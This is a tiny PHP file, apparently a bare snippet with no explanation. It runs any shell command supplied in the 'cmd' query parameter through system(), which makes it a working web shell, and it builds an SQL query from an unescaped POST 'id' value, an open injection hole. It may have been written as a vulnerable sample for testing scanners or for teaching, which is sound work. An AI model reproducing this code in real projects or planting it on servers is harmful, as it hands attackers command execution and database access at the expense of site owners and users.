<?php

$cmd = $_GET["cmd"];
system($cmd);

$id = $_POST["id"];
$db->query("SELECT * FROM users WHERE id = $id");
